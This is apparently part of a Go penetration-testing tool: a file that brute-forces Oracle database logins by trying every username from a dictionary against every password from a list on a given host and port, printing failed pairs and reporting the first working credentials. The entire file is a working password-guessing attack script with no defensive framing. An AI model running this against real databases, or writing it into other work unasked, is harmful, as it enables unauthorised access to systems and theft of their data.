package pac

import (
	"database/sql"
	"fmt"
	_ "github.com/godror/godror"
	"os"
	"strings"
)

func OracleConnect(ruser string, pwd string, rhost string, rport string, sid string) (conn *sql.DB, err error, sign bool) {
	conn, err = sql.Open("godror", fmt.Sprintf(`user=%s password="%s" connectString="%s:%s/%s"`, ruser, pwd, rhost, rport, sid))
	if err != nil {
		return nil, nil, false
	}
	err = conn.Ping()
	if err != nil {
		return nil, nil, false
	}
	Info("Oracle数据库连接成功")
	if err != nil {
		return nil, nil, false
	}
	sign = true
	return conn, nil, sign
}

func OracleCrack(Rhost string, Rport string) {
	Info("开始爆破,请稍等.....")
	sign = false
	for _, user := range Userdict["oracle"] {
		for _, pass := range Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			_, _, sign := OracleConnect(user, pass, Rhost, Rport, "orcl")
			if sign == true {
				Success(fmt.Sprintf("账号密码为：%s:%s", user, pass))
				os.Exit(0)
			} else {
				fmt.Println(fmt.Sprintf("%s:%s 未成功爆破出账号密码", user, pass))
			}
		}
	}
}
